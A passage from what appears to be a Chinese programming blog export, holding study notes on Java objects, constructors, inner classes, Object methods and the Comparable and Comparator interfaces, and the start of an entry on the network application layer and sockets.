<h2 id="方法参数"><a href="#方法参数" class="headerlink" title="方法参数"></a>方法参数</h2><p>java的对象引用是<code>按值传递</code>而不是<code>引用调用</code>。<strong>方法得到的是所有参数值得一个拷贝，而不是指针</strong>。方法不能修改传递给它的任何参数变量的内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(<span class="keyword">double</span> Salary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Salary = Salary * <span class="number">3</span>; <span class="comment">// 这不会对Salary对应的实参造成任何影响</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，改变对象参数状态不是一件难事。<strong>由于java得到的是对象引用的拷贝，而对象引用及其拷贝都会指向同一个对象</strong>，所以可以通过改变对象引用拷贝达到修改对象参数的目的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(Employee e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e.Salary = e.Salary * <span class="number">3</span>; <span class="comment">// 这会修改Employee实例的Salary域</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结一下：</p>
<ol>
<li>一个方法不能修改一个基本数据类型的参数</li>
<li>一个方法可以改变一个对象参数的状态</li>
<li>一个方法不能让对象参数引用一个新的对象（即无法改变实参的引用对象，这点也是由按值传递决定的）</li>
</ol>
<h1 id="对象构造"><a href="#对象构造" class="headerlink" title="对象构造"></a>对象构造</h1><p>Java提供了多种编写构造器的机制</p>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>多个方法有相同的名字、不同的参数，便产生了重载。编译器必须挑选出具体执行哪个方法，它通过各个方法给出的参数类型与特定方法调用所使用的值类型进行匹配来挑选出相应的方法（这个过程称为重载解析）。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String aName, <span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = aName;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(<span class="keyword">int</span> aid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;Employee&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.id = aid;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java允许重载任何方法，而不仅仅是构造器方法。因此，要完整地表述一个方法，需要指出方法名以及参数类型。这叫做方法的<strong>签名（signature）</strong>。例如：String类有4个称为<code>indexOf</code>的公有方法，它们的签名是：</p>
<ul>
<li>indexOf(int)</li>
<li>indexOf(int, int)</li>
<li>indexOf(String)</li>
<li>indexOf(String, int)</li>
</ul>
<p>返回类型不是方法签名的一部分。也就是说：<strong>不能有两个名字相同，参数类型相同，返回值类型却不同的方法</strong></p>
<h2 id="默认域初始化"><a href="#默认域初始化" class="headerlink" title="默认域初始化"></a>默认域初始化</h2><p>如果在构造器中没有显式地给域赋初值，那么就会自动地赋为默认值：数值为0，布尔值为false，对象引用为null。这是域与局部变量的主要不同点。必须明确地初始化方法中的局部变量，而不一定要明确初始化域。</p>
<h2 id="无参数构造器"><a href="#无参数构造器" class="headerlink" title="无参数构造器"></a>无参数构造器</h2><p>很多类都包含一个无参数的构造函数，对象由无参数的构造函数创建时，其状态会设置为适当的默认值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.salary = <span class="number">5000</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果在编写一个类时没有编写构造器，那么系统会提供一个无参数构造器，该构造器将所有实例域设置为默认值：数值为0，布尔值为false，引用对象为null</p>
<h2 id="显示域初始化"><a href="#显示域初始化" class="headerlink" title="显示域初始化"></a>显示域初始化</h2><p>通过重载类的构造器方法啊，可以采用多种形式设置类的实例域的初始化方法，确保无论怎样调用构造器，每个实例域都可以被设置为一个有意义的初值。</p>
<p>可以在类定义中直接将一个值赋给任何域。<strong>在执行构造器之前，先执行赋值操作</strong>。初始值不一定是常量值，也可以调用方法对域进行初始化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id = assignId();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">assignId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r = nextId;</span><br><span class="line">        nextId++;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用另一个构造器"><a href="#调用另一个构造器" class="headerlink" title="调用另一个构造器"></a>调用另一个构造器</h2><p>关键字<code>this</code>引用方法的隐式参数。然而，这个关键字还有另一个含义：<br>如果构造器的第一个语句形如：<code>this(...)</code>，这个构造器将调用同一个类的另一个构造器，这样对公共的构造器代码部分只编写一次即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(<span class="keyword">double</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用另一构造器 Employee(String aName, double aSalary)</span></span><br><span class="line">    <span class="keyword">this</span>(<span class="string">&quot;Employee #&quot;</span> + nextId, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="对象初始化块"><a href="#对象初始化块" class="headerlink" title="对象初始化块"></a>对象初始化块</h2><p>在一个类的声明中，可以包含多个代码块。只要构造类的对象，这些块就会被执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> nextId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化域</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.id = nextId;</span><br><span class="line">        nextId++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无论使用哪个构造器构造对象，id域都在对象初始化块中被初始化。首先运行初始化块，然后才运行构造器。</p>
<p><strong>下面是调用构造器的具体处理步骤：</strong></p>
<ol>
<li>所有数据域初始化为默认值（0，false，null）</li>
<li>按照在类声明中出现的次序，依次执行所有的初始化语句和初始化块</li>
<li>如果构造器第一行调用了第二个构造器，则执行第二个构造器主体</li>
<li>执行构造器主体</li>
</ol>
<h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><p>在一个类的内部还可以定义内部类，内部类又分为静态内部类和非静态内部类：</p>
<h2 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h2><p>非静态内部类可以访问外部类的私有属性。非静态内部类实例必须依赖于外部类实例而存在，语法为：<code>new outerclass().new innerclass()</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>&lt;<span class="title">Item</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node first;</span><br><span class="line">    <span class="keyword">private</span> Node last;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Node next;</span><br><span class="line">        <span class="keyword">private</span> Item item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Item item)</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><p>关键字<code>static</code>修饰的内部类为静态内部类，可以没有外部类实例。语法为；<code>new outerclass.innerclass()</code></p>
<p>静态内部类不可以访问外部类的私有属性和方法，可以访问外部类私有静态成员:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hero</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hp;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BattleWin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;战斗胜利！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BreakTower</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hp = <span class="number">50000</span>;</span><br><span class="line">        <span class="keyword">if</span> (hp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            Hero.BattleWin();</span><br><span class="line">            <span class="comment">// 静态内部类无法访问外部类实例属性。方法</span></span><br><span class="line">            System.out.println(name + <span class="string">&quot;胜利！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="类之间的关系"><a href="#类之间的关系" class="headerlink" title="类之间的关系"></a>类之间的关系</h1><p>最常见的关系有：</p>
<ol>
<li>依赖(deependence)。如果一个类的方法操纵另一个类的对象，我们就说一个类依赖于另一个类。应尽可能减少将相互依赖的类，如果类A不依赖于B，那么B的任何改变对A没有影响。这称为<code>让类之间的耦合度最小</code></li>
<li>聚合(aggregation)。意味着一个类的对象包含另一个类的对象。如订单类对象包含商品类对象</li>
<li>继承(inheritance)。继承是对象的一种扩展，子类拥有父类的全部方法和属性</li>
</ol>
<h1 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h1><p>Object类时Java中所有类的始祖，Java中每个类都是由它扩展而来的。如果没有明确指出超类，Object类就是这个类的超类。</p>
<p>可以使用Object类型的变量引用任何类型的变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Employee(<span class="string">&quot;David&quot;</span>, <span class="number">4500</span>);</span><br></pre></td></tr></table></figure>
<p>不过，Object类型变量只是各种值的持有者，想要对其中的内容进行操作需要进行类型转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee e = (Employee) obj;</span><br></pre></td></tr></table></figure>
<p>所有数组，不管是基本类型数组还是对象数组，都扩展了Object类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj;</span><br><span class="line">Emplpyee[] staff = <span class="keyword">new</span> Employee[<span class="number">3</span>];</span><br><span class="line">obj = staff; <span class="comment">// OK</span></span><br><span class="line">obj = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>]; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<h2 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h2><p>Object类中的equals方法用于检测一个对象是否等于另一个对象。两个对象是否相等是通过所属类及实例域状态决定的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检查两个类是否引用同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == otherObject) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果形参为null返回false</span></span><br><span class="line">        <span class="keyword">if</span> (otherObject == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果两个类所属类不相等，返回false</span></span><br><span class="line">        <span class="keyword">if</span> (getClass() != otherObject.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 想在我们知道otherObject是一个Employee类</span></span><br><span class="line">        Employee other = (Employee) otherObject;</span><br><span class="line">        <span class="comment">// 检查实例域是否相等</span></span><br><span class="line">        <span class="keyword">return</span> Objects.equals(<span class="keyword">this</span>.name, other.name)</span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.salary == other.salary</span><br><span class="line">        <span class="comment">// 可以使用this.name.equals(other.name)，为了防止this.name为null最好使用Objects.equals()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在子类中定义equals方法时，首先调用超类的equals。如果检测失败，对象就不可能相等。如果超类中的域相等，就需要比较子类中的域：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// super.equals检测otherObject与超类是否相等</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.equals(otherObject)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        Manager other = (Manager) otherObject;</span><br><span class="line">        <span class="comment">// 比较子类中的域</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.bonus == other.bonus;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面给出编写完美equals方法的步骤：</p>
<ol>
<li>显示参数命名为otherObject，稍后将它转化成一个叫做other的变量</li>
<li>检测this与otherObject是否引用同一个对象：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> == otherObject) <span class="keyword">return</span> <span class="keyword">true</span>；</span><br></pre></td></tr></table></figure></li>
<li>检测otherObject是否为null<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherObject == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></li>
<li>比较this与otherObject是否属于同一个类<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (getClass() != otherObject.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></li>
<li>将otherObject转化为相应类型变量<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassName other = (ClassName) otherObject</span><br></pre></td></tr></table></figure></li>
<li>比较实例域，用<code>==</code>比较基本类型域，<code>Objects.equals()</code>比较对象域(对于数组类型的域使用<code>Arrays.equals</code>方法判断是否相等)<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> field1 == other.field1</span><br><span class="line">    &amp;&amp; Objects.equals(<span class="keyword">this</span>.field2, other.field2)</span><br><span class="line">    &amp;&amp; Arrays.equals(<span class="keyword">this</span>.field3, other.field3)</span><br><span class="line">    &amp;&amp; ...</span><br></pre></td></tr></table></figure>
<h2 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h2>Object中的hashCode返回由对象导出的整型值。<em>在定义类时如果没有覆盖hashCode方法，会根据对象的内存地址产生一个散列码。如果定义了hashCode，则由对象内容导出一个散列码</em>。</li>
</ol>
<p>获得一个对象的散列码可以用<code>Objects.hashCode</code>方法，获得基本类型的散列码可以打包后调用hashCode方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Double.hashCode(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<h2 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h2><p>Object类的toString方法返回表示对象值的字符串。一般表示形式为<code>类名[域值]</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.awt.Point[x=<span class="number">10</span>,y=<span class="number">10</span>]</span><br></pre></td></tr></table></figure>
<p>当对象与字符串通过<code>+</code>操作符连接起来，Java编译器就会自动地调用toString方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Point p = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">String message = <span class="string">&quot;当前位置为&quot;</span> + p;</span><br></pre></td></tr></table></figure>
<p>如果x是一个对象，调用System.out.println(x)，println方法会自动调用x.toString()。<br>Object类定义了toString方法用来打印对象所属的类名和散列码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(System.out) <span class="comment">// 输入java.io.PrintStream@2f6684</span></span><br></pre></td></tr></table></figure>
<p>这是因为PrintStream类没有覆盖toString方法。数组继承了这一特性，打印数组中的元素使用<code>Arrays.toString</code>方法</p>
<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口（interface）主要用来描述类具有什么功能，而不给出每个功能的具体实现。这种做法有利于实现类的扩展，因为Java不支持多继承。接口还在有利于多态，因为虽然接口无法构造对象，却能声明接口的变量，且这个变量能引用所有实现了该接口的类对象。</p>
<h2 id="构造一个接口"><a href="#构造一个接口" class="headerlink" title="构造一个接口"></a>构造一个接口</h2><p>构造接口与构造类相似，只是将<code>class</code>改为<code>interface</code>，此外，还可以将接口定义为泛型，接受类型参数，这样会提高接口的可用性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object other)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Compareable</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T other)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接口内声明了一些方法，绝不应含有实例域，而实现方法和提供实例域的任务都由实现接口的那个类完成。接口中的方法自动是<code>public</code>，在类中定义这些方法时也应使用<code>public</code></p>
<h2 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h2><p>为了让类实现接口，有两个步骤：</p>
<ol>
<li>让类声明为实现给定的接口</li>
<li>对接口中所有方法进行定义</li>
</ol>
<p>将类声明为实现某些接口，使用关键字<code>implement</code>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object otherObject)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee other = (Employee) otherObject;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="title">implement</span> <span class="title">Compareable</span>&lt;<span class="title">Employee</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee other)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接口也可以继承，子接口有父接口中声明的方法和常量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">time</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">runable</span> <span class="keyword">extends</span> <span class="title">Moveable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">speed</span><span class="params">()</span></span>; <span class="comment">// 实现runable的类必须实现time()和speed()方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="接口的默认方法"><a href="#接口的默认方法" class="headerlink" title="接口的默认方法"></a>接口的默认方法</h2><p>用<code>default</code>关键字可以在接口中声明方法时进行简单的定义，但不能涉及实例域因为接口没有实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MouseListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">mouseClcked</span><span class="params">(MouseEvent event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;鼠标点击&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此一来，实现这个接口的类可以不覆盖这个默认方法而具有默认方法提供的功能。</p>
<h3 id="默认方法冲突"><a href="#默认方法冲突" class="headerlink" title="默认方法冲突"></a>默认方法冲突</h3><ol>
<li>如果接口的默认方法名与超类的方法名冲突了，遵循<code>超类优先</code>原则，即接口提供的默认方法会被忽略。</li>
<li>如果多个接口提供的默认方法名冲突，由类决定使用哪个接口的默认方法：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Person和Named都有默认方法getName()</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">implement</span> <span class="title">Person</span>, <span class="title">Named</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Person.<span class="keyword">super</span>.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果多个接口都没有提供默认方法，那么要么在类中覆盖这个方法，要么这是一个抽象类，把这个方法定义为抽象方法由子类去实现  </li>
</ol>
<h2 id="接口Comparable与Comparator"><a href="#接口Comparable与Comparator" class="headerlink" title="接口Comparable与Comparator"></a>接口Comparable与Comparator</h2><h3 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h3><p>Comparable接口是函数式接口，此接口只有一个方法compare，比较此对象与指定对象的顺序，如果该对象小于、等于或大于指定对象，则分别返回负整数、零或正整数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt; </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T o)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个类若实现了Comparable接口，意味着这个类支持排序。实现了Comparable接口的类的对象的数组或列表可以使用<code>Arrays.sort</code>或<code>Collections.sort</code>进行自动排序。</p>
<h3 id="Comparator接口"><a href="#Comparator接口" class="headerlink" title="Comparator接口"></a>Comparator接口</h3><p>实现了Comparator接口的类是一个比较器。对某些没有实现Comparable接口的类进行排序，只要提供一个比较器告诉排序方法按照什么规则进行排序就可以了，该接口的定义为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparator</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>实现Comparator接口的类一定要实现compare方法，而不一定要实现equals方法。<br>int compare(T o1, T o2) 是“比较o1和o2的大小”。返回“负数”，意味着“o1比o2小”；返回“零”，意味着“o1等于o2”；返回“正数”，意味着“o1大于o2”。</p>
<h3 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h3><p>Comparable是排序接口，若一个类实现了Comparable接口，就意味着“该类支持排序”。而Comparator是比较器，我们若需要控制某个类的次序，可以建立一个“该类的比较器”来进行排序。</p>
<p>Comparable相当于“内部比较器”，而Comparator相当于“外部比较器”。</p>
<p>两种方法各有优劣， 用Comparable 简单， 只要实现Comparable 接口的对象直接就成为一个可以比较的对象，但是需要修改源代码。 用Comparator 的好处是不需要修改源代码， 而是另外实现一个比较器， 当某个自定义的对象需要作比较的时候，把比较器和对象一起传递过去就可以比大小了， 并且在Comparator 里面用户可以自己实现复杂的可以通用的逻辑，使其可以匹配一些比较简单的对象，那样就可以节省很多重复劳动了。<br>（二者的使用实例见：<a href="https://www.cnblogs.com/xujian2014/p/5215082.html">参考博客</a>）</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之应用层</title>
    <url>/2018/06/07/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<h2 id="网络应用结构"><a href="#网络应用结构" class="headerlink" title="网络应用结构"></a>网络应用结构</h2><ul>
<li>客户机/服务器结构（C/S）</li>
<li>点对点结构（P2P）</li>
<li>混合结构（综合 C/S 与 P2P）</li>
</ul>
<p>应用层是程序员最常接触的层次，应当非常熟悉。</p>
<h2 id="端系统间的进程通信"><a href="#端系统间的进程通信" class="headerlink" title="端系统间的进程通信"></a>端系统间的进程通信</h2><p>一个进程可以理解为运行在端系统中的的一个程序。当进程运行在相同的端系统上时，它们使用进程间通信机制相互通信。而在不同的端系统上，通过跨越计算机网络交换<code>报文</code>实现进程间的通信。</p>
<p>多数应用程序由通信进程对组成，每对中的两个进程互相发送报文，从一个进程向另一个进程发送报文就必须经过下面的计算机网络。进程通过一个被称为<code>套接字</code>的软件接口向网络发送报文和接受报文。<code>套接字</code>类似于一栋屋子的门，无论是要进入屋子还是离开屋子，都要进过门。<code>套接字</code>是应用层与运输层的接口。在运输层，开发者对于<code>套接字</code>几乎没有控制权，只能</p>
<ol>
<li>选择运输层协议</li>
<li>设定几个参数，如最大缓存、最大报文段长度等</li>
